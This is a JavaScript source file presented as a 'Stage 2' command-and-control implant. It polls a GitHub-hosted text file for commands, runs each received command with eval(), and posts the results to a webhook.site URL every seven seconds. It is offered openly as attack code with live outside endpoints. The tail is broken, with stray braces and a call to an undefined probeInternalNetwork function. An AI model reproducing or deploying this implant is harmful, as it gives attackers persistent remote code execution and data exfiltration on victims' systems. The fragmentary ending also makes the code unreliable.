/**
 * Gemini C2 Implant (Stage 2)
 * Author: HazaVVIP & Copilot
 * Establishes persistent command and control.
 */
console.log('[C2] Implant active. Establishing command loop.');

const commandServerUrl = 'https://raw.githubusercontent.com/HazaVVIP/webshell/main/command.txt';
const reportBackUrl = 'https://webhook.site/7b9d5c1a-9f4a-4e2b-8c1c-3d8e9f6a2b0d'; // Endpoint laporan Anda

async function commandLoop() {
    try {
        // Ambil perintah dari server C2 (GitHub)
        const response = await fetch(`${commandServerUrl}?t=${new Date().getTime()}`); // Cache-busting
        const command = await response.text();
        const trimmedCommand = command.trim();

        // Hanya eksekusi jika ada perintah baru
        if (trimmedCommand && trimmedCommand !== 'NOOP' && trimmedCommand !== window.lastExecutedCommand) {
            console.log(`[C2] Received command: ${trimmedCommand}`);
            window.lastExecutedCommand = trimmedCommand; // Simpan perintah terakhir untuk mencegah eksekusi berulang
            let result;
            try {
                result = eval(command); // Eksekusi perintah
            } catch (e) {
                result = `ERROR: ${e.name} - ${e.message}`;
            }

            // Kirim kembali hasilnya ke endpoint laporan
            await fetch(reportBackUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: trimmedCommand, result: String(result) })
            });
            console.log('[C2] Command result sent.');
        }
    } catch (e) {
        console.error(`[C2] Loop error: ${e.message}`);
    }

    // Tunggu sebelum polling berikutnya
    setTimeout(commandLoop, 7000); // Poll setiap 7 detik
}

// Inisialisasi state dan mulai loop C2
window.lastExecutedCommand = '';
commandLoop();    }
}

// Jalankan serangan eskalasi.
probeInternalNetwork();
